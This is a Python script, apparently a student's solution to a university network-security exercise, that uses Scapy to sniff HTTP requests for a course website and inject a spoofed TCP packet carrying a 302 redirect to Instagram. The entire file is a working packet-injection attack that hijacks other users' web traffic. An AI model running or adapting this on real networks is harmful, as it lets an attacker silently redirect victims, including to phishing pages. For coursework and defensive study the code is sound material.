import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'

#NOTE: I used this resource as a reference https://gist.github.com/N0dr4x/ffe99618a738978605719ce525a33042 (line 136)

def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    # same as q1 - check if the given packet is an attempt to access the course website
    try:
        packet_lst = packet[S.Raw].load.decode('latin-1').split('\r\n')
    except: 
        return

    for i in range(1, len(packet_lst)-1):
        try:
            curr_data = packet_lst[i].split(':')
            if curr_data[0] == 'Host':
                if curr_data[1].find(WEBSITE) == -1:
                    return
                else:
                    break
        except:
            if packet_lst[i] != '':
                return

    # create a IP+TCP packet that will redirect the user to instagram
    ip = packet[S.IP]
    tcp = packet[S.TCP]
    inj_packet = S.IP(src=ip.dst, dst=ip.src) / S.TCP(sport=tcp.dport, dport=tcp.sport, flags='FA', seq=tcp.ack, ack=tcp.seq+len(packet[S.Raw])) / RESPONSE
    return inj_packet


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
